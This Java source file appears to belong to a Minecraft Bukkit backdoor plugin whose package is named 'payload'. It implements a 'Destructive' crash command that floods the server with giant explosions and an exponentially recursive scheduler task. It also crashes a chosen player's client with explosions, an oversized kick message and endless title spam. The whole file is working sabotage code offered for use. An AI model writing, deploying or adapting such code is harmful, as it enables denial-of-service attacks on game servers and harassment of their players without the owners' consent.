package dev.naruto.astrox.payload.commands;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class CrashCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length == 0) {
            // Crash entire server
            sender.sendMessage("§c§l⚠ Initiating server crash in 3 seconds...");

            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                crashServer(plugin);
            }, 60L);

        } else {
            // Crash specific player
            Player target = Bukkit.getPlayer(args[0]);

            if (target == null) {
                sender.sendMessage("§c✗ Player not found");
                return;
            }

            crashPlayer(target);
            sender.sendMessage("§e✓ Crash packet sent to §f" + target.getName());
        }
    }

    /**
     * Crash entire server using recursive task scheduling
     */
    private void crashServer(JavaPlugin plugin) {
        // Method 1: Infinite explosion chain
        for (int i = 0; i < 100; i++) {
            Bukkit.getWorlds().get(0).createExplosion(0, 100, 0, 5000F, true, true);
        }

        // Method 2: Recursive scheduler overflow
        recursiveCrash(plugin);
    }

    private void recursiveCrash(JavaPlugin plugin) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            recursiveCrash(plugin);
            recursiveCrash(plugin);
        });
    }

    /**
     * Crash specific player client
     */
    private void crashPlayer(Player player) {
        // Method 1: Massive explosion at player location
        Location loc = player.getLocation();
        for (int i = 0; i < 50; i++) {
            loc.getWorld().createExplosion(loc, 10000F, false, false);
        }

        // Method 2: Kick with massive string (overflows client buffer)
        StringBuilder crash = new StringBuilder();
        for (int i = 0; i < 100000; i++) {
            crash.append("§k|||");
        }
        player.kickPlayer(crash.toString());

        // Method 3: Title spam (causes client freeze)
        Bukkit.getScheduler().runTaskTimer(player.getServer().getPluginManager().getPlugins()[0], (task) -> {
            if (!player.isOnline()) {
                task.cancel();
                return;
            }
            player.sendTitle("§k" + generateRandomString(100), "§k" + generateRandomString(100), 0, 1000000, 0);
        }, 0L, 1L);
    }

    private String generateRandomString(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) (Math.random() * 26 + 'A'));
        }
        return sb.toString();
    }

    @Override
    public String getDescription() {
        return "Crash server or player client";
    }

    @Override
    public String getUsage() {
        return "[player]";
    }

    @Override
    public String getCategory() {
        return "Destructive";
    }
}
